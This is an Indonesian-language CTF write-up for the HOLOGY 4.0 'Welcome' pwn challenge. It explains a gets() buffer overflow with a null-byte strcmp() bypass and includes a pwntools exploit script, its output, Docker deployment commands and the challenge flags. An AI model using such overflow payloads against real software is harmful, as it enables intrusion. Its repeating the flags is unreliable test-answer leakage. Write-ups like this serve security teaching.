# Welcome (100 Pts)

## Deskripsi
Apakah soal ini sanity check? Hmm.. Aku tidak yakin kalau itu adalah flag asli

Author : Inlandsche

nc 13.214.13.126 31337

## Hint 
Tidak ada

## Proof of Concept
Pertama, lakukan analisa kode program dengan menggunakan software disassambler (`ghidra/IDA`) atau dengan `gdb`.
Program memiliki kelemahan pada fungsi `gets()`. Untuk mendapatkan flag, diharuskan melakukan overwrite terhadap dua variabel agar sesuai dengan keinginan program. Agar dapat melakukan overwrite, kita harus melakukan bypass fungsi `strcmp()` dengan menambahkan **null bytes** `\x00`.


Script python untuk menyelesaikannya

```
from pwn import *

p = process('./welcome')

strcmp = b"IsThisReal?"

# Address didapatkan dengan menggunakan gdb
# Address ini merupakan address dari string yang dibutuhkan 
competition = 0x40204a
glaf = 0x402054

# Perhitungan offset dapat dilakukan secara manual atau dengan pwn cyclic
offset_glaf = 28

payload = strcmp

# Byte kosong digunakan untuk bypass strcmp()
payload += b"\x00"
payload += b"a"*offset_glaf
payload += p64(glaf)
payload += p64(competition)


p.sendline(payload)
p.interactive()
```

Output dari script tersebut

```
[*] '/home/inlandsche/CySec/Hology/Hology Soal/Welcome/welcome'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[x] Starting local process '/home/inlandsche/CySec/Hology/Hology Soal/Welcome/welcome'
[+] Starting local process '/home/inlandsche/CySec/Hology/Hology Soal/Welcome/welcome': pid 9588
[*] Switching to interactive mode
Selamat datang di HOLOGY 4.0

hology4{w3lc0m3_t0_hology}

Nice!
hology4{0v3Rwr1te_iz_ez_y4h4h4}
[*] Process '/home/inlandsche/CySec/Hology/Hology Soal/Welcome/welcome' stopped with exit code 0 (pid 9588)
[*] Got EOF while reading in interactive
```

<details>
<summary>Flag : </summary>
hology4{0v3Rwr1te_iz_ez_y4h4h4}
</details>

## Referensi
Soal Angstrom CTF (sanity)

## Deployment

```
docker build -t welcome .
docker run -d --name=welcome -p 31337:31337/tcp welcome
crontab /path/to/crontab
```

## Flag
<details>
<summary>Tekan untuk melihat flag</summary>

    hology4{w3lc0m3_t0_hology}

</details>

